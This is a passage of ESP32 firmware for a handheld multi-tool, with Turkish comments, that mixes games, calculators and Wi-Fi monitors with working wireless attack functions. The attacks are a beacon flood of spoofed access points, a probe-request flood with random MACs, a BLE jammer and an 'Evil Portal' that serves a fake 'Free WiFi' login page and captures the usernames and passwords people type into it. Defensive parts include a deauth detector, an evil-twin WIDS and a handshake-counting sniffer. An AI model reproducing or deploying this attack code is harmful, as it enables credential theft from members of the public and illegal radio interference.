  recoverFromWiFi();
}

// ==========================================
// BEACON FLOOD (genişletildi)
// ==========================================
void runWiFiBeaconFloodExtended() {
  stopRadios();
  WiFi.disconnect(true);
  WiFi.mode(WIFI_AP);
  delay(100);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);

  const char *fakes[] = {
      "FreeWiFi",   "Starbucks", "McDonalds", "AirportWiFi", "HotelGuest",
      "PublicWiFi", "AndroidAP", "iPhone",    "HomeWiFi",    "OfficeWiFi",
      "Linksys",    "NETGEAR",   "TP-Link",   "ATTWiFi",     "VerizonWiFi"};
  const int num = 15;
  uint8_t pkt[128];
  int chan = 1;

  displayInfo("Beacon Flood", "Broadcasting 15 APs", "SEL to stop");

  while (!selPressed() && !checkEscapeToMenu()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;

    for (int i = 0; i < num; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++)
        spoofed[j] = random(256);
      spoofed[0] = 0x02; // Local Admin MAC

      memset(pkt, 0, 128);
      pkt[0] = 0x80; // Beacon frame
      pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Destination Broadcast
      memcpy(pkt + 10, spoofed, 6); // Source MAC
      memcpy(pkt + 16, spoofed, 6); // BSSID

      pkt[22] = random(256); // Sequence
      pkt[23] = random(256);
      int pos = 24;

      memset(pkt + pos, 0, 8); // Timestamp
      pos += 8;

      pkt[pos++] = 0x64; pkt[pos++] = 0x00; // Beacon interval
      pkt[pos++] = 0x21; pkt[pos++] = 0x04; // Capability

      // SSID Tag
      pkt[pos++] = 0x00;
      pkt[pos++] = strlen(fakes[i]);
      memcpy(pkt + pos, fakes[i], strlen(fakes[i]));
      pos += strlen(fakes[i]);

      // Supported Rates Tag
      pkt[pos++] = 0x01; pkt[pos++] = 0x08;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;

      // Channel Tag
      pkt[pos++] = 0x03; pkt[pos++] = 0x01; pkt[pos++] = chan;

      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delayMicroseconds(300);
    }
    yield();
  }
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// PROBE REQUEST FLOOD
// ==========================================
void runProbeFlood() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  const char *ssids[] = {"HomeWiFi",  "Office",   "Starbucks", "iPhone",
                         "AndroidAP", "FreeWiFi", "Target"};
  uint8_t pkt[128];
  displayInfo("Probe Flood", "SEL to stop");
  while (!selPressed()) {
    for (int i = 0; i < 7; i++) {
      esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
      uint8_t mac[6];
      for (int j = 0; j < 6; j++)
        mac[j] = random(256);
      esp_wifi_set_mac(WIFI_IF_STA, mac);
      memset(pkt, 0, sizeof(pkt));
      pkt[0] = 0x40; // Probe Request
      int pos = 24;
      pkt[pos++] = 0x00;
      pkt[pos++] = strlen(ssids[i]);
      memcpy(pkt + pos, ssids[i], strlen(ssids[i]));
      pos += strlen(ssids[i]);
      esp_wifi_80211_tx(WIFI_IF_STA, pkt, pos, false);
      delay(2);
    }
    yield();
  }
  recoverFromWiFi();
}

// ==========================================
// DEAUTH DEDEKTÖR
// ==========================================
volatile uint32_t deauthDetectCount = 0;
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->payload[0] == 0xC0)
    deauthDetectCount++;
}

void runDeauthDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
  deauthDetectCount = 0;
  unsigned long lastCheck = millis();
  displayInfo("Deauth Detect", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck > 1000) {
      display.clearDisplay();
      drawStatusBar();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(0, 10);
      display.println("Deauth Detector");
      display.setCursor(0, 22);
      display.print("Count: ");
      display.print(deauthDetectCount);
      display.setCursor(0, 34);
      display.print("Status: ");
      if (deauthDetectCount > 20)
        display.print("ATTACK!");
      else if (deauthDetectCount > 0)
        display.print("Suspicious");
      else
        display.print("Normal");
      display.display();
      deauthDetectCount = 0;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// BLE SCANNER
// ==========================================
static BLEAdvertisedDevice *scannedDevices[10] = {nullptr};
static String bleNames[10], bleMacs[10];
static int bleRSSI[10], scanCount = 0;

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (scanCount >= 10)
      return;
    scannedDevices[scanCount] = new BLEAdvertisedDevice(dev);
    bleNames[scanCount] = dev.haveName() ? dev.getName().c_str() : "Unknown";
    bleMacs[scanCount] = dev.getAddress().toString().c_str();
    bleRSSI[scanCount] = dev.getRSSI();
    scanCount++;
  }
};

void runBLEScanner() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  scanCount = 0;
  displayInfo("BLE Scanner", "Scanning...");
  pScan->start(5, false);
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(1);
    if (scanCount == 0) {
      display.setCursor(0, 10);
      display.println("No devices");
    } else {
      int idx = sel % scanCount;
      display.setCursor(0, 10);
      display.print(idx + 1);
      display.print("/");
      display.print(scanCount);
      display.setCursor(0, 22);
      display.println(bleNames[idx]);
      display.setCursor(0, 34);
      display.print(bleRSSI[idx]);
      display.println(" dBm");
    }
    display.display();
    if (upPressed())
      sel = (sel == 0) ? scanCount - 1 : sel - 1;
    if (downPressed())
      sel = (sel + 1) % scanCount;
    yield();
  }
  for (int i = 0; i < scanCount; i++)
    delete scannedDevices[i];
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// BLE TARGET JAM
// ==========================================
void runBLETargetJam() {
  initRadios();
  displayInfo("BLE Targ.Jam", "SEL to stop");
  while (!selPressed()) {
    if (radio1Active)
      radio.setChannel(2);
    if (radio2Active)
      radio2.setChannel(2);
    delayMicroseconds(150);
    if (radio1Active)
      radio.setChannel(26);
    if (radio2Active)
      radio2.setChannel(26);
    delayMicroseconds(150);
    if (radio1Active)
      radio.setChannel(80);
    if (radio2Active)
      radio2.setChannel(80);
    delayMicroseconds(150);
    yield();
  }
}

// ==========================================
// WiFi ANALYZER (128x64)
// ==========================================
// ==========================================
// WiFi ANALYZER (128x64 ULTRA LUXE)
// ==========================================
void runWiFiAnalyzer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  safeDelay(100);
  int n = WiFi.scanNetworks();
  if (n == 0) {
    displayInfo("No networks");
    safeDelay(2000);
    recoverFromWiFi();
    return;
  }
  int bestRSSI[14] = {0};
  String bestSSID[14];
  int chCongestion[14] = {0};

  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) {
      chCongestion[ch]++;
      if (WiFi.RSSI(i) > bestRSSI[ch] || bestRSSI[ch] == 0) {
        bestRSSI[ch] = WiFi.RSSI(i);
        bestSSID[ch] = WiFi.SSID(i);
      }
    }
  }

  // En az çakışma olan en temiz kanalı (Best Channel) bulma
  int bestRecChannel = 1;
  int minScore = 999;
  for (int c = 1; c <= 13; c++) {
    int score = chCongestion[c] * 3;
    if (c > 1) score += chCongestion[c - 1];
    if (c < 13) score += chCongestion[c + 1];
    if (score < minScore) {
      minScore = score;
      bestRecChannel = c;
    }
  }

  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 10);
  display.print("Best Ch: ");
  display.print(bestRecChannel);
  display.print(" (Rec)");

  for (int ch = 1; ch <= 13; ch++) {
    int barH = (bestRSSI[ch] != 0) ? map(bestRSSI[ch], -100, -30, 2, 40) : 0;
    int x = map(ch, 1, 13, 6, 122);
    if (ch == bestRecChannel) {
      display.fillRect(x - 2, 60 - barH, 5, barH + 1, SSD1306_WHITE);
    } else {
      display.drawLine(x, 60, x, 60 - barH, SSD1306_WHITE);
    }
    display.drawPixel(x, 62, SSD1306_WHITE);
  }
  display.display();
  safeDelay(2500);

  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    int ch = sel + 1;
    display.setCursor(0, 10);
    display.print("Ch:");
    display.print(ch);
    display.print(ch == bestRecChannel ? " [RECOMMENDED]" : "");
    display.setCursor(0, 24);
    if (bestRSSI[ch] != 0) {
      display.print("SSID: ");
      display.println(bestSSID[ch]);
      display.setCursor(0, 36);
      display.print("RSSI: ");
      display.print(bestRSSI[ch]);
      display.print(" dBm");
      display.setCursor(0, 48);
      display.print("Count: ");
      display.print(chCongestion[ch]);
      display.print(" APs");
    } else {
      display.print("Status: Clear / Empty");
    }
    display.display();
    if (upPressed())
      sel = (sel == 0) ? 12 : sel - 1;
    if (downPressed())
      sel = (sel + 1) % 13;
    yield();
  }
  WiFi.scanDelete();
  recoverFromWiFi();
}

// ==========================================
// SİNYAL METRE (REALTIME WAVEFORM CHART)
// ==========================================
void runSignalMeter() {
  stopRadios();
  if (!radio2Active) {
    displayInfo("Radio2 required");
    safeDelay(2000);
    return;
  }
  radio2.setAutoAck(false);
  radio2.startListening();
  int ch = 1;
  uint8_t history[128] = {0};
  int head = 0;
  int peakVal = 0;

  displayInfo("Signal Meter", "Ch:" + String(ch), "UP/DN chg SEL exit");
  while (!selPressed()) {
    if (upPressed()) {
      ch = (ch % 125) + 1;
      radio2.setChannel(ch);
      memset(history, 0, 128);
      peakVal = 0;
    }
    if (downPressed()) {
      ch = (ch == 1) ? 125 : ch - 1;
      radio2.setChannel(ch);
      memset(history, 0, 128);
      peakVal = 0;
    }
    int rpd = 0;
    for (int i = 0; i < 10; i++) {
      if (radio2.testRPD())
        rpd++;
      delayMicroseconds(100);
    }
    if (rpd > peakVal) peakVal = rpd;

    history[head] = map(rpd, 0, 10, 0, 36);
    head = (head + 1) % 128;

    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("Ch:");
    display.print(ch);
    display.print(" RPD:");
    display.print(rpd);
    display.print("/10 PK:");
    display.print(peakVal);

    // Live Waveform Plot
    for (int i = 0; i < 127; i++) {
      int idx1 = (head + i) % 128;
      int idx2 = (head + i + 1) % 128;
      display.drawLine(i, 63 - history[idx1], i + 1, 63 - history[idx2], SSD1306_WHITE);
    }
    display.drawFastHLine(0, 26, 128, SSD1306_WHITE);
    display.display();
    safeDelay(40);
    yield();
  }
  radio2.stopListening();
  initRadios();
}

// ==========================================
// EVIL PORTAL
// ==========================================
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Free WiFi</title></head>
<body style='text-align:center;font-family:Arial;'>
<h1>Free WiFi Login</h1>
<form action='/login' method='POST'>
<input name='user' placeholder='Username'><br>
<input name='pass' type='password' placeholder='Password'><br>
<input type='submit' value='Connect'>
</form></body></html>)rawliteral";

void runEvilPortal() {
  stopRadios();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free WiFi");
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.begin();
  capturedCredentials = "";
  displayInfo("Evil Portal", "AP: Free WiFi", "Waiting...");
  while (!selPressed()) {
    dnsServer.processNextRequest();
    WiFiClient client = webServer.available();
    if (client) {
      String request = client.readStringUntil('\r');
      client.flush();
      if (request.indexOf("POST /login") != -1) {
        String body = client.readString();
        int uIdx = body.indexOf("user=");
        int pIdx = body.indexOf("pass=");
        if (uIdx != -1 && pIdx != -1) {
          String user = body.substring(uIdx + 5, body.indexOf('&', uIdx));
          String pass = body.substring(pIdx + 5);
          pass.replace("+", " ");
          capturedCredentials = "U:" + user + " P:" + pass;
        }
        client.println(
            "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: "
            "close\r\n\r\n<h1>Connected!</h1>");
      } else {
        client.print("HTTP/1.1 200 OK\r\nContent-Type: "
                     "text/html\r\nConnection: close\r\n\r\n");
        client.print(FPSTR(loginPage));
      }
      client.stop();
      if (capturedCredentials != "") {
        displayInfo("Captured!", capturedCredentials, "SEL to exit");
      }
    }
    yield();
  }
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  recoverFromWiFi();
}

// ==========================================
// DOOM (128x64 uyumlu)
// ==========================================
static const uint8_t PROGMEM doomMap[16][16] = {
    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
    {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
    {1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1},
    {1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1},
    {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
    {1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1},
    {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
    {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
    {1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1},
    {1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1},
    {1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1},
    {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
    {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
    {1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1},
    {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
    {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}};

float posX = 8.0, posY = 8.0, dirX = -1.0, dirY = 0.0, planeX = 0.0, planeY = 0.66;
unsigned long selHoldStart = 0;

void shootRay() {
  display.fillRect(0, 0, 128, 64, SSD1306_WHITE);
  display.display();
  delay(30);
  display.fillRect(0, 0, 128, 64, SSD1306_BLACK);
  display.display();
}

void drawDoomHUD() {
  // Mini-Map Overlay (Top-Right: 16x16 pixels)
  display.drawRect(111, 0, 17, 17, SSD1306_WHITE);
  for (int my = 0; my < 16; my++) {
    for (int mx = 0; mx < 16; mx++) {
      if (pgm_read_byte(&doomMap[mx][my]) > 0) {
        display.drawPixel(112 + mx, 1 + my, SSD1306_WHITE);
      }
    }
  }
  // Player dot on Mini-Map
  display.drawPixel(112 + (int)posX, 1 + (int)posY, SSD1306_WHITE);
  display.drawPixel(111 + (int)posX, 1 + (int)posY, SSD1306_WHITE);

  // Crosshair in center
  display.drawFastHLine(61, 32, 7, SSD1306_WHITE);
  display.drawFastVLine(64, 29, 7, SSD1306_WHITE);

  // Shotgun Barrel Sprite (Bottom Center)
  display.fillRect(58, 50, 12, 14, SSD1306_WHITE);
  display.fillRect(60, 47, 8, 3, SSD1306_WHITE);
  display.fillRect(62, 44, 4, 3, SSD1306_BLACK);
}

// Old DOOM function removed (see main runDOOM with Monsters below)

// ==========================================
// HESAP MAKİNESİ
// ==========================================
void runCalculator() {
  int num1 = 0, num2 = 0;
  char op = '+';
  int cursor = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print(cursor == 0 ? ">" : " ");
    display.print(num1);
    display.print(' ');
    display.print(cursor == 1 ? ">" : " ");
    display.print(op);
    display.print(' ');
    display.print(cursor == 2 ? ">" : " ");
    display.print(num2);
    if (cursor == 3) {
      display.print(" = ");
      switch (op) {
      case '+':
        display.print(num1 + num2);
        break;
      case '-':
        display.print(num1 - num2);
        break;
      case '*':
        display.print(num1 * num2);
        break;
      case '/':
        display.print(num2 ? num1 / num2 : 0);
        break;
      }
    }
    display.setCursor(0, 55);
    display.print("UP/DN:chg SEL:next");
    display.display();
    if (upPressed()) {
      if (cursor == 0)
        num1++;
      else if (cursor == 2)
        num2++;
      else if (cursor == 1)
        op = (op == '+' ? '-' : op == '-' ? '*' : op == '*' ? '/' : '+');
    }
    if (downPressed()) {
      if (cursor == 0)
        num1--;
      else if (cursor == 2)
        num2--;
      else if (cursor == 1)
        op = (op == '+' ? '/' : op == '/' ? '*' : op == '*' ? '-' : '+');
    }
    if (selPressed()) {
      cursor = (cursor + 1) % 4;
      if (cursor == 3)
        safeDelay(200);
    }
    yield();
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// DİRENÇ RENK KODU HESAPLAYICI
// ==========================================
const char resistorColors[10][8] = {"Black",  "Brown", "Red",  "Orange",
                                    "Yellow", "Green", "Blue", "Violet",
                                    "Gray",   "White"};
const long multiplierTable[10] = {
    1, 10, 100, 1000, 10000, 100000, 1000000, 10000000, 100000000, 1000000000};

void runResistorCalc() {
  int bands = 4;
  int band[4] = {0, 0, 0, 1};
  int numDigits = 2;
  int selBand = 0;
  bool choose = true;
  while (choose) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("Bands:");
    display.print(bands);
    display.setCursor(0, 22);
    display.print("UP/DN change SEL ok");
    display.display();
    if (upPressed() || downPressed()) {
      bands = (bands == 4 ? 5 : 4);
      safeDelay(200);
    }
    if (selPressed()) {
      choose = false;
      numDigits = (bands == 4 ? 2 : 3);
      safeDelay(200);
    }
    yield();
  }
  while (!selPressed()) {
    long val;
    if (bands == 4)
      val = (band[0] * 10 + band[1]) * multiplierTable[band[2]];
    else
      val = (band[0] * 100 + band[1] * 10 + band[2]) * multiplierTable[band[3]];
    String tolStr =
        (band[bands - 1] == 1 ? "1%" : (band[bands - 1] == 2 ? "2%" : "0.5%"));
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print(val);
    display.print(" Ohm ");
    display.print(tolStr);
    int idx = selBand;
    if (idx < numDigits) {
      display.setCursor(0, 22);
      display.print("Digit ");
      display.print(idx + 1);
      display.print(": ");
      display.print(resistorColors[band[idx]]);
    } else if (idx == numDigits) {
      display.setCursor(0, 22);
      display.print("Multiplier: ");
      display.print(resistorColors[band[numDigits]]);
    } else {
      display.setCursor(0, 22);
      display.print("Tolerance: ");
      display.print(resistorColors[band[bands - 1]]);
    }
    display.display();
    if (upPressed()) {
      band[idx] = (band[idx] + 1) % 10;
      safeDelay(100);
    }
    if (downPressed()) {
      band[idx] = (band[idx] + 9) % 10;
      safeDelay(100);
    }
    if (selPressed()) {
      selBand = (selBand + 1) % (bands);
      safeDelay(150);
    }
    yield();
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// WiFi MONITOR (genişletildi)
// ==========================================
void runWiFiMonitor() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WiFi Monitor", "SEL to exit");
  while (!selPressed()) {
    int n = WiFi.scanNetworks();
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("APs:");
    display.print(min(n, 8));
    for (int i = 0; i < min(n, 8); i++) {
      int rssi = WiFi.RSSI(i);
      int bar = map(rssi, -100, -30, 0, 110);
      display.fillRect(0, 24 + i * 6, bar, 4, SSD1306_WHITE);
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 12)
        ssid = ssid.substring(0, 12);
      display.setCursor(0, 24 + i * 6);
      display.print(ssid);
    }
    display.display();
    WiFi.scanDelete();
    safeDelay(2000);
    yield();
  }
  recoverFromWiFi();
}

// ==========================================
// SNAKE (ULTRA LUXE HIGH SCORE)
// ==========================================
static int snakeHighScore = 0;

void runSnakeGame() {
  const int gw = 32, gh = 13; // Reserved top bar for score
  int sx[100], sy[100];
  int len = 3, dx = 1, dy = 0, fx, fy;
  bool go = false;
  randomSeed(millis());
  for (int i = 0; i < len; i++) {
    sx[i] = gw / 2 - i;
    sy[i] = gh / 2;
  }
  auto pf = [&]() {
    do {
      fx = random(gw);
      fy = random(gh);
      go = false;
      for (int i = 0; i < len; i++)
        if (sx[i] == fx && sy[i] == fy)
          go = true;
    } while (go);
  };
  pf();
  unsigned long lm = millis();
  displayInfo("Snake Luxe", "UP/DN:turn", "SEL:exit");
  safeDelay(800);

  while (!selPressed()) {
    if (upPressed()) {
      int t = dx;
      dx = -dy;
      dy = t;
    }
    if (downPressed()) {
      int t = dx;
      dx = dy;
      dy = -t;
    }
    
    // Dynamic Speed: Accelerates as score increases
    int moveDelay = max(60, 180 - (len - 3) * 6);
    if (millis() - lm > moveDelay) {
      int nx = sx[0] + dx, ny = sy[0] + dy;
      if (nx < 0 || nx >= gw || ny < 0 || ny >= gh)
        break;
      bool selfHit = false;
      for (int i = 0; i < len; i++) {
        if (sx[i] == nx && sy[i] == ny) {
          selfHit = true;
          break;
        }
      }
      if (selfHit) break;

      for (int i = len; i > 0; i--) {
        sx[i] = sx[i - 1];
        sy[i] = sy[i - 1];
      }
      sx[0] = nx;
      sy[0] = ny;
      if (nx == fx && ny == fy) {
        len++;
        pf();
      }
      lm = millis();
    }

    display.clearDisplay();
    // Top Score Bar
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    int currentScore = len - 3;
    if (currentScore > snakeHighScore) snakeHighScore = currentScore;
    display.print("SCR:");
    display.print(currentScore);
    display.setCursor(65, 0);
    display.print("HI:");
    display.print(snakeHighScore);
    display.drawFastHLine(0, 10, 128, SSD1306_WHITE);

    // Render Snake & Food
    for (int i = 0; i < len; i++) {
      display.fillRect(sx[i] * 4, 12 + sy[i] * 4, 3, 3, SSD1306_WHITE);
    }
    display.drawRect(fx * 4, 12 + fy * 4, 4, 4, SSD1306_WHITE);

    display.display();
    yield();
  }

  int finalScore = len - 3;
  if (finalScore > snakeHighScore) snakeHighScore = finalScore;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(30, 10);
  display.println("GAME OVER!");
  display.setCursor(20, 28);
  display.print("Score: ");
  display.println(finalScore);
  display.setCursor(20, 42);
  display.print("High Score: ");
  display.println(snakeHighScore);
  display.display();

  while (!selPressed())
    yield();
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// PACKET COUNTER
// ==========================================
volatile uint32_t pktCount = 0;
int pktChannel = 1;
void pktCb(void *buf, wifi_promiscuous_pkt_type_t type) { pktCount++; }
void runPacketCounter() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pktCb);
  esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE);
  pktCount = 0;
  displayInfo("Packet Count", "Ch:" + String(pktChannel), "UP/DN chg SEL exit");
  while (!selPressed()) {
    if (upPressed()) {
      pktChannel = (pktChannel % 13) + 1;
      esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE);
      pktCount = 0;
    }
    if (downPressed()) {
      pktChannel = (pktChannel == 1) ? 13 : pktChannel - 1;
      esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE);
      pktCount = 0;
    }
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("Ch:");
    display.print(pktChannel);
    display.setCursor(0, 30);
    display.print("Pkt:");
    display.print(pktCount);
    display.display();
    safeDelay(500);
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// WiFi PACKET SNIFFER + HANDSHAKE DETECTOR
// ==========================================
volatile uint32_t mgmtCount = 0, ctrlCount = 0, dataCount = 0, eapolCount = 0;
void snifferCb(void *buf, wifi_promiscuous_pkt_type_t pkt_type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t frameType = pkt->payload[0];
  uint8_t typeVal = frameType & 0x0C;
  if (typeVal == 0x00)
    mgmtCount++;
  else if (typeVal == 0x04)
    ctrlCount++;
  else if (typeVal == 0x08) {
    dataCount++;
    if (pkt->rx_ctrl.sig_len > 32) {
      for (int i = 24; i < pkt->rx_ctrl.sig_len - 2; i++) {
        if (pkt->payload[i] == 0x88 && pkt->payload[i + 1] == 0x8E) {
          eapolCount++;
          break;
        }
      }
    }
  }
}

void runWiFiSniffer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCb);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  mgmtCount = ctrlCount = dataCount = eapolCount = 0;
  int chan = 1;
  displayInfo("WiFi Sniffer", "Ch:" + String(chan), "UP/DN chg SEL exit");
  while (!selPressed()) {
    if (upPressed()) {
      chan = (chan % 13) + 1;
      esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
      mgmtCount = ctrlCount = dataCount = eapolCount = 0;
    }
    if (downPressed()) {
      chan = (chan == 1) ? 13 : chan - 1;
      esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
      mgmtCount = ctrlCount = dataCount = eapolCount = 0;
    }
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("Ch:");
    display.print(chan);
    display.setCursor(50, 10);
    if (eapolCount > 0) {
      display.print("HS:");
      display.print(eapolCount);
    }
    display.setCursor(0, 24);
    display.print("Mgmt (M): ");
    display.print(mgmtCount);
    display.setCursor(0, 36);
    display.print("Ctrl (C): ");
    display.print(ctrlCount);
    display.setCursor(0, 48);
    display.print("Data (D): ");
    display.print(dataCount);

    if (eapolCount > 0) {
      display.drawRect(0, 56, 128, 8, SSD1306_WHITE);
      display.setCursor(2, 57);
      display.print("EAPOL HANDSHAKE!!");
    }
    display.display();
    safeDelay(800);
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// WIDS
// ==========================================
#define MAX_APS 30
struct APInfo {
  uint8_t bssid[6];
  String ssid;
  int rssi;
  uint32_t lastSeen;
  bool isEvilTwin;
};
APInfo knownAPs[MAX_APS];
int knownAPCount = 0;
volatile uint32_t beaconCount = 0;
volatile uint32_t deauthCount = 0;
volatile bool floodAlert = false;
volatile bool evilTwinAlert = false;
String evilTwinSSID = "";

void wids_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  uint8_t type_subtype = frame[0];
  uint8_t subtype = type_subtype & 0xFC;
  if (subtype == 0x80) {
    beaconCount++;
    uint8_t *bssid = frame + 10;
    int8_t rssi = pkt->rx_ctrl.rssi;
    String ssid = "";
    int pos = 36;
    while (pos < pkt->rx_ctrl.sig_len - 2) {
      uint8_t id = frame[pos];
      uint8_t len = frame[pos + 1];
      if (id == 0 && len > 0) {
        char temp[len + 1];
        memcpy(temp, &frame[pos + 2], len);
        temp[len] = 0;
        ssid = String(temp);
        break;
      }
      pos += len + 2;
    }
    bool found = false;
    for (int i = 0; i < knownAPCount; i++) {
      if (memcmp(knownAPs[i].bssid, bssid, 6) == 0) {
        knownAPs[i].rssi = rssi;
        knownAPs[i].lastSeen = millis();
        found = true;
        break;
      }
    }
    if (!found && knownAPCount < MAX_APS) {
      memcpy(knownAPs[knownAPCount].bssid, bssid, 6);
      knownAPs[knownAPCount].ssid = ssid;
      knownAPs[knownAPCount].rssi = rssi;
      knownAPs[knownAPCount].lastSeen = millis();
      knownAPs[knownAPCount].isEvilTwin = false;
      knownAPCount++;
    }
    for (int i = 0; i < knownAPCount; i++) {
      for (int j = i + 1; j < knownAPCount; j++) {
        if (knownAPs[i].ssid == knownAPs[j].ssid && knownAPs[i].ssid != "") {
          if (memcmp(knownAPs[i].bssid, knownAPs[j].bssid, 6) != 0) {
            if (abs(knownAPs[j].rssi - knownAPs[i].rssi) > 20) {
              evilTwinAlert = true;
              evilTwinSSID = knownAPs[i].ssid;
            }
          }
        }
      }
    }
  } else if (subtype == 0xC0) {
    deauthCount++;
  }
}

void runWIDS() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
